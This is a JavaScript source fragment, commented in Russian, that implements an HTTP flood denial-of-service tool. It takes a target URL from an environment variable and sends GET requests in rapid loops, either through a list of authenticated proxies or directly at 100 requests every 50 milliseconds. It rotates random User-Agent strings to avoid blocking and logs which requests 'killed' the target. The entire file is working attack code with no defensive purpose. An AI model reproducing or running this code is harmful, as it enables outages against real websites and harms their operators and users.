/**
* Атака с прокси
* @param url
*/
function doAttackWithProxy(url){
setInterval(() => {
    for(let i in Proxies){
        let proxy = `http://${Proxies[i].login}:${Proxies[i].pass}@${Proxies[i].host}:${Proxies[i].port}`;
        ((i) => {request({method:'GET', url:url, proxy: proxy, headers: {'User-Agent': getRandAgent()}}, (err,response) => {
            if(err){
                console.log(`${proxy} - ${url} - [killed]`)
                e.emit('error',err, proxy)
            }else {
                console.log(`${proxy} - ${url} - [${response.statusCode}]`);

            }
        });
        })(i);
    }
},100);
}

/**
* Атака без прокси
* @param url
*/
function doAttack(url){
setInterval(() => {
    for(let i = 0; i < 100; i++){
        ((i) => {request({method:'GET', url:url, headers: {'User-Agent': getRandAgent()}}, (err,response) => {
            if(err){
                console.log(`${url} - [killed]`)
                e.emit('error',err)
            }else {
                console.log(`${url} - [${response.statusCode}]`);
            }
        });
        })(i);
    }
},50);
}

e.on('error',function(err){
console.error(err.toString());
});

try{
    if(process.env.url){
        if(Proxies.length){
            doAttackWithProxy(process.env.url);
        }else {
            console.log("proxies пустые");
            doAttack(process.env.url);
        }
    }else {
        console.log("url пустой");
    }
}catch(e){
    console.log(e);
}


function getRandAgent() {
    let rand = Math.floor(Math.random() * agents.length);
    return agents[rand];
}